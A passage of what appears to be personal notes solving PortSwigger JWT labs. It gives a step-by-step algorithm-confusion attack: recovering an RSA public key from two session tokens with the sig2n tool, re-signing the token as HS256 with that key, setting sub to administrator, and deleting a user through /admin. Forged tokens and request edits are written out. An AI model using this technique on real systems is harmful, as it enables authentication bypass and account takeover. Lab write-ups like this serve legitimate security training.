Cookie: session=eyJraWQiOiI1N2VlZGI3Ny00NWUwLTQ1NDUtODc1Mi01NTQ2ZWExZDRhYTciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTU1MjM3Nn0.RmhCq2FLNUvHOaESQllwkOvek9aeyP9Tfr5_UJdW9Cdu7zv7x8-o7OBtBACAvF4ROpOgZjS-VLaofCDrf1zrsmSCkC9VuZ6rwaxhglv9YljqMiDCtaJV1YdaO0vs2KRgjRpl88StUdPaVZJoo_HBseuizcmyrNvp_-YDV3ooL7kAdS4kakpnUgi79MObVxaEQLh3QinVnGrzjwxMUMUIEUHSyeK80tWK0EQaYVTtPeOnaWxQa1moW9C8bXdWtNIPr1AjYFtGAUIQeX7UJ5oM23hcvWK1rfGq1gqCzO51Y4HmLX7UGITgYixoQJSeYX3edqb3tTeuGoj6ihBnZtF2nQ

To

Cookie: session=eyJraWQiOiI1N2VlZGI3Ny00NWUwLTQ1NDUtODc1Mi01NTQ2ZWExZDRhYTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTU1NTIzNzZ9.07m82YwLe1NHSDM53W2dIOPR0LNBLz89K3OhQF9qIjQ

Response:

HTTP/1.1 200 OK

<a href="/admin">Admin panel

Change:

GET /my-account HTTP/1.1

To

GET /admin HTTP/1.1

Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">Delete

Change:

GET /admin HTTP/1.1

To

GET /admin/delete?username=carlos HTTP/1.1

Response:

HTTP/1.1 302 Found

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613231853.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618055826.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618054618.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618060048.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618060356.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618060756.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618061028.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618061245.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618061322.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618061352.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618061413.png)

### JWT authentication bypass via algorithm confusion with no exposed key
```bash

# This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

# To solve the lab, first obtain the server's public key. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: HTTP history
Find:

GET /my-account HTTP/1.1

Send to repeater
Log out
Login as wiener:peter
Go to: HTTP history
Find: (the most recent occurrence of:)

GET /my-account HTTP/1.1

Send to repeater

Copy cookie 1:

Cookie: session=eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTU2MDQxMH0.jouv_wCMh0-HtMs1f8BK3OQ7rADqx34ihnYMRqCihhmSs44YIZO4GcgnCZ6x97AV4_bHxhzuq6EFJnTecI_trGl5LxyeEkmHQVAqzmIXO0WQ2kr5eueFi9s0BkY9gUDaaWI4xb5ZcMAstIP5ws6R-O3RYAqm8hYlcRv-iABQ22ncs7FJQa_Qlvk9iHZzBg-3fDBGjNrZeUFYy8Blhm5KecpuZ8uyUUSa4r3NLcYW9OEL4TB2XqidrpFQIbnjNBsKfkaZFz2pxv-PNF80Fv42zS_xADDJNvs34Wus1sS-d8LZjaiXo9cqHgwC3gSBa_tVIVHWe0FRO7IBe1WbLa_ctQ

Copy cookie 2:

Cookie: session=eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTU2MDQ0MH0.cC_Z87HFFcCbF4139ttVUEKN14f6opdd0C1pLFAfNHV7LpvnB2Tk_Bk-qoOCjsWhVOw3gjpgYcCKbR4qn0Hja9GPG-6jpuT52nDaMkZyMaPLe7TY1_d2SFcfBNz9fW00f25v_G2sO1OElIBDfeGlOJCAgeNWz24WjJ1Caqo1oUB_tMnxXgyxnkN-mqi6sDlOFHR98g5j6CBnCKXm_Ko6dnr-eLPwxrbWMHB_1xmVFCttLCh40gqf0cUwmEuVcuuD5roVE2yShSuuFZja3g4bDRuLmRxO5ErQ7loyh_N1q6kUqyof_59SGL2lRGmwLYBUCS-MtSB7t2CLaprEQ6h7tA

Use the Portswigger gurus docker setup:
Syntax:

docker run --rm -it portswigger/sig2n cookie1 cookie2

Like so:

sudo docker run --rm -it portswigger/sig2n eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTU2MDQxMH0.jouv_wCMh0-HtMs1f8BK3OQ7rADqx34ihnYMRqCihhmSs44YIZO4GcgnCZ6x97AV4_bHxhzuq6EFJnTecI_trGl5LxyeEkmHQVAqzmIXO0WQ2kr5eueFi9s0BkY9gUDaaWI4xb5ZcMAstIP5ws6R-O3RYAqm8hYlcRv-iABQ22ncs7FJQa_Qlvk9iHZzBg-3fDBGjNrZeUFYy8Blhm5KecpuZ8uyUUSa4r3NLcYW9OEL4TB2XqidrpFQIbnjNBsKfkaZFz2pxv-PNF80Fv42zS_xADDJNvs34Wus1sS-d8LZjaiXo9cqHgwC3gSBa_tVIVHWe0FRO7IBe1WbLa_ctQ eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTU2MDQ0MH0.cC_Z87HFFcCbF4139ttVUEKN14f6opdd0C1pLFAfNHV7LpvnB2Tk_Bk-qoOCjsWhVOw3gjpgYcCKbR4qn0Hja9GPG-6jpuT52nDaMkZyMaPLe7TY1_d2SFcfBNz9fW00f25v_G2sO1OElIBDfeGlOJCAgeNWz24WjJ1Caqo1oUB_tMnxXgyxnkN-mqi6sDlOFHR98g5j6CBnCKXm_Ko6dnr-eLPwxrbWMHB_1xmVFCttLCh40gqf0cUwmEuVcuuD5roVE2yShSuuFZja3g4bDRuLmRxO5ErQ7loyh_N1q6kUqyof_59SGL2lRGmwLYBUCS-MtSB7t2CLaprEQ6h7tA

Response:

Running command: python3 [jwt_forgery.py](http://jwt_forgery.py) <token1> <token2>  
  
Found n with multiplier 1:  
Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUJONGJNVy9Ec293YXg4am5sTU84NQphOGx3SG5NcHhSWjArRlVSWWlLb0tnU0lwNWVBWU1vT0k3UEpha2Z4ZDZEaG1lQ3NIeG9FMisxTFo0bkk1SDRMClpyWnhXbUF4V3ZVUmxOM0E5WmV1ZjN5VXd4dUtTcHhvaU8rKzZBdGJXODZlcUhrNmtqTjdkOXRMN0R4RzEvbEgKQ3FTTDdHZjBuWU5aMmlocStHdGsrTG1xM2daU2RacUNjSkVVTysrRExRNUY5K0FScWV6enNCV3I0blNFN3lyTgpHVEovTThodlRHaXFMbjV1azZDUlRaWFdFaWF0d3hEeTY0TUpZOVMvekJLNExCcWY5SjRJdVQ3QVhpVllQb2NtCjlUWk55N0ZMRUlqbW93UmtMYTVGK1VLU1Nkc0p4NW52UWdDdWcyWXFRTkh4QW1uVmR5dzFoQmRsd1ZxYVEvM28KUGdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==  
Tampered JWT: eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU1NjQzNDAwfQ.bvUAs_Ym7eRFta2jikBDn574yRDAHsBaZWd53vB7gDA  
Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQk40Yk1XL0Rzb3dheDhqbmxNTzg1YThsd0huTXB4UlowK0ZVUllpS29LZ1NJcDVlQVlNb08KSTdQSmFrZnhkNkRobWVDc0h4b0UyKzFMWjRuSTVINExaclp4V21BeFd2VVJsTjNBOVpldWYzeVV3eHVLU3B4bwppTysrNkF0Ylc4NmVxSGs2a2pON2Q5dEw3RHhHMS9sSENxU0w3R2YwbllOWjJpaHErR3RrK0xtcTNnWlNkWnFDCmNKRVVPKytETFE1RjkrQVJxZXp6c0JXcjRuU0U3eXJOR1RKL004aHZUR2lxTG41dWs2Q1JUWlhXRWlhdHd4RHkKNjRNSlk5Uy96Qks0TEJxZjlKNEl1VDdBWGlWWVBvY205VFpOeTdGTEVJam1vd1JrTGE1RitVS1NTZHNKeDVudgpRZ0N1ZzJZcVFOSHhBbW5WZHl3MWhCZGx3VnFhUS8zb1BnSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K  
Tampered JWT: eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU1NjQzNDAwfQ.INY5BfrV2FdLTvnpnqmPItDstyjvkNuXPt1J80eJ5J0  
  
Found n with multiplier 2:  
Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFtOE5tTGZoMlVZTlkrUnp5bUhlYwp0ZVM0RHptVTRvczZmQ3FJc1JGVUZRSkVVOHZBTUdVSEVkbmt0U1A0dTlCd3pQQldENDBDYmZhbHM4VGtjajhGCnMxczRyVEFZclhxSXltN2dlc3ZYUDc1S1lZM0ZKVTQwUkhmZmRBV3RyZWRQVkR5ZFNSbTl1KzJsOWg0amEveWoKaFZKRjlqUDZUc0dzN1JRMWZEV3lmRnpWYndNcE9zMUJPRWlLSGZmQmxvY2krL0FJMVBaNTJBclY4VHBDZDVWbQpqSmsvbWVRM3BqUlZGejgzU2RCSXBzcnJDUk5XNFloNWRjR0VzZXBmNWdsY0ZnMVArazhFWEo5Z0x4S3NIME9UCmVwc201ZGlsaUVSelVZSXlGdGNpL0tGSkpPMkU0OHozb1FCWFFiTVZJR2o0Z1RUcXU1WWF3Z3V5NEsxTklmNzAKSHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==  
Tampered JWT: eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU1NjQzNDAwfQ.AI0hKzk402SKnhK3HQSm-SvipVUg_WN25FYxVxV58Go  
Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQW04Tm1MZmgyVVlOWStSenltSGVjdGVTNER6bVU0b3M2ZkNxSXNSRlVGUUpFVTh2QU1HVUgKRWRua3RTUDR1OUJ3elBCV0Q0MENiZmFsczhUa2NqOEZzMXM0clRBWXJYcUl5bTdnZXN2WFA3NUtZWTNGSlU0MApSSGZmZEFXdHJlZFBWRHlkU1JtOXUrMmw5aDRqYS95amhWSkY5alA2VHNHczdSUTFmRFd5ZkZ6VmJ3TXBPczFCCk9FaUtIZmZCbG9jaSsvQUkxUFo1MkFyVjhUcENkNVZtakprL21lUTNwalJWRno4M1NkQklwc3JyQ1JOVzRZaDUKZGNHRXNlcGY1Z2xjRmcxUCtrOEVYSjlnTHhLc0gwT1RlcHNtNWRpbGlFUnpVWUl5RnRjaS9LRkpKTzJFNDh6MwpvUUJYUWJNVklHajRnVFRxdTVZYXdndXk0SzFOSWY3MEh3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K  
Tampered JWT: eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU1NjQzNDAwfQ.RxAAzYH90Vz9fJGBekRJAo_W1UwlOz0SL5C81TFxI5Y  

Go to: Repeater -> Request -> Raw
Change:

Cookie: session=eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogImFkbWluaXN0cmF0b3IiLCAiZXhwIjogMTY1NTY0MzQwMH0.1QLieaiWmdt1PHC4ledwKROeppDR1SQdvcX-HGoxXSk

To

Cookie: session=eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU1NjQzNDAwfQ.bvUAs_Ym7eRFta2jikBDn574yRDAHsBaZWd53vB7gDA

Response:

HTTP/1.1 302 Found

To

Cookie: session=eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU1NjQzNDAwfQ.INY5BfrV2FdLTvnpnqmPItDstyjvkNuXPt1J80eJ5J0

Response:

HTTP/1.1 302 Found

To

Cookie: session=eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU1NjQzNDAwfQ.AI0hKzk402SKnhK3HQSm-SvipVUg_WN25FYxVxV58Go

Response:

HTTP/1.1 200 OK

Copy the corresponding base64 encoded x509 key:

Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFtOE5tTGZoMlVZTlkrUnp5bUhlYwp0ZVM0RHptVTRvczZmQ3FJc1JGVUZRSkVVOHZBTUdVSEVkbmt0U1A0dTlCd3pQQldENDBDYmZhbHM4VGtjajhGCnMxczRyVEFZclhxSXltN2dlc3ZYUDc1S1lZM0ZKVTQwUkhmZmRBV3RyZWRQVkR5ZFNSbTl1KzJsOWg0amEveWoKaFZKRjlqUDZUc0dzN1JRMWZEV3lmRnpWYndNcE9zMUJPRWlLSGZmQmxvY2krL0FJMVBaNTJBclY4VHBDZDVWbQpqSmsvbWVRM3BqUlZGejgzU2RCSXBzcnJDUk5XNFloNWRjR0VzZXBmNWdsY0ZnMVArazhFWEo5Z0x4S3NIME9UCmVwc201ZGlsaUVSelVZSXlGdGNpL0tGSkpPMkU0OHozb1FCWFFiTVZJR2o0Z1RUcXU1WWF3Z3V5NEsxTklmNzAKSHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==

Go to: JWT Editor Keys -> New Symmetric Key -> Generate -> Key
Change:

"k": "AtN-r4FRxM-4pmK_YSu4Ew"

To

"k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFtOE5tTGZoMlVZTlkrUnp5bUhlYwp0ZVM0RHptVTRvczZmQ3FJc1JGVUZRSkVVOHZBTUdVSEVkbmt0U1A0dTlCd3pQQldENDBDYmZhbHM4VGtjajhGCnMxczRyVEFZclhxSXltN2dlc3ZYUDc1S1lZM0ZKVTQwUkhmZmRBV3RyZWRQVkR5ZFNSbTl1KzJsOWg0amEveWoKaFZKRjlqUDZUc0dzN1JRMWZEV3lmRnpWYndNcE9zMUJPRWlLSGZmQmxvY2krL0FJMVBaNTJBclY4VHBDZDVWbQpqSmsvbWVRM3BqUlZGejgzU2RCSXBzcnJDUk5XNFloNWRjR0VzZXBmNWdsY0ZnMVArazhFWEo5Z0x4S3NIME9UCmVwc201ZGlsaUVSelVZSXlGdGNpL0tGSkpPMkU0OHozb1FCWFFiTVZJR2o0Z1RUcXU1WWF3Z3V5NEsxTklmNzAKSHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="

-> OK
Go to: Repeater -> Request -> JSON Web Token -> Payload
Change:

"sub": "wiener",

To

"sub": "administrator",

Go to: Repeater -> Request -> JSON Web Token -> Sign -> Signing key (newly created key) (dont modify header) -> OK
Change:

Cookie: session=eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTU2MDQ0MH0.cC_Z87HFFcCbF4139ttVUEKN14f6opdd0C1pLFAfNHV7LpvnB2Tk_Bk-qoOCjsWhVOw3gjpgYcCKbR4qn0Hja9GPG-6jpuT52nDaMkZyMaPLe7TY1_d2SFcfBNz9fW00f25v_G2sO1OElIBDfeGlOJCAgeNWz24WjJ1Caqo1oUB_tMnxXgyxnkN-mqi6sDlOFHR98g5j6CBnCKXm_Ko6dnr-eLPwxrbWMHB_1xmVFCttLCh40gqf0cUwmEuVcuuD5roVE2yShSuuFZja3g4bDRuLmRxO5ErQ7loyh_N1q6kUqyof_59SGL2lRGmwLYBUCS-MtSB7t2CLaprEQ6h7tA

To

Cookie: session=eyJraWQiOiI3MmMzYzg3Zi01NWQ1LTQ2NzctODZlNy0wYmRmMGNmMmU0NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogImFkbWluaXN0cmF0b3IiLCAiZXhwIjogMTY1NTY0MzQwMH0.1QLieaiWmdt1PHC4ledwKROeppDR1SQdvcX-HGoxXSk

Response:

HTTP/1.1 200 OK

<a href="/admin">Admin panel

Change:

GET /my-account HTTP/1.1

To

GET /admin HTTP/1.1

Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">Delete

Change:

GET /admin HTTP/1.1

To

GET /admin/delete?username=carlos HTTP/1.1

Response:

HTTP/1.1 302 Found

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613231853.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618082548.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618082702.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618083301.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618083342.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618084217.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618084359.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618084925.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618085212.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618085255.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618085330.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618085353.png)

#hacking
